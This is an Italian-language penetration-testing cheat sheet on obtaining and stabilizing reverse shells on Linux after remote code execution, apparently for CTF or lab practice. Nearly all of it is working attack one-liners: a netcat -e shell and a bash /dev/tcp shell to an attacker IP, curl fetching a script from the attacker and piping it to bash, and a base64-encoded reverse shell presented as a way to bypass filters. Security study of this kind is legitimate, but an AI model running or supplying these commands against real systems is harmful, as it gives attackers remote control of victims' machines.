# Reverse Shells & Stabilization

| Caratteristica | Dettaglio |
| :--- | :--- |
| **Tool necessari** | `netcat` (nc), `bash`, `python3`, `stty`, `socat` |
| **SO Target** | Linux |
| **Quando effettuare** | Dopo aver ottenuto RCE (Remote Code Execution) |
| **Info Utili** | Stabilizzazione della shell per evitare crash e abilitare l'interattività |

### Tipologie di Accesso
1. **Bind-Shell:** la vittima deve esporre un servizio che l'attaccante può utilizzare per connettersi direttamente.
2. **Reverse-Shell:** l'attaccante si trasforma in server e si fa contattare dalla vittima.

### Creazione Reverse Shell
**Tentativo 1: Netcat (se presente e con flag -e):**
```bash
nc -nv <ATTACKER_IP> <PORT> -e /bin/bash
```
*Esempio:*
```bash
nc -nv 10.10.14.176 9001 -e /bin/bash
```

**Sulla macchina attaccante (ascolto):**
```bash
nc -nvlp <PORT>
```
*Esempio:*
```bash
nc -nvlp 9001
```

**Tentativo 2: Bash Socket:**
```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```
*Esempio:*
```bash
bash -i >& /dev/tcp/10.10.14.176/9001 0>&1
```

**Tentativo 3: Tramite script hostato:**
Lato server (attaccante), creare `rev.sh` e lanciare server python:
```bash
python3 -m http.server <PORT_WEB>
```
Sulla vittima triggerare:
```bash
curl 'http://<ATTACKER_IP>:<PORT_WEB>/rev.sh' | bash
```
*Esempio:*
```bash
curl 'http://10.10.14.176:8000/rev.sh' | bash
```

### Stabilizzazione Shell
Sulla macchina target (una volta ottenuta la shell):
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
*(Mandare in background con CTRL+Z)*

Sulla nostra macchina (locale):
```bash
stty raw -echo; fg
```
*(Premere Invio due volte)*
```bash
export TERM=xterm
```

**Per fixare le dimensioni (Rows/Cols):**
In locale: `stty -a`
Sulla vittima:
```bash
stty rows <N> cols <M>
```
*Esempio:*
```bash
stty rows 22 cols 77
```

### Metodi in Base64
Utile per evitare caratteri speciali (newline, ecc.) o bypassare filtri.
```bash
echo -n "<B64_ENCODED_COMMAND>" | base64 -d | bash
```
*Esempio:*
```bash
echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzYvOTAwMSAwPiYx" | base64 -d | bash
```

### URL Fondamentali
- [RevShells.com](https://www.revshells.com/)
- [Pentestmonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Stabilize Shell Tutorial (Medium)](https://medium.com/h7w/how-to-stabilize-a-shell-like-a-pro-without-losing-your-mind-bcb28c4fe79e)
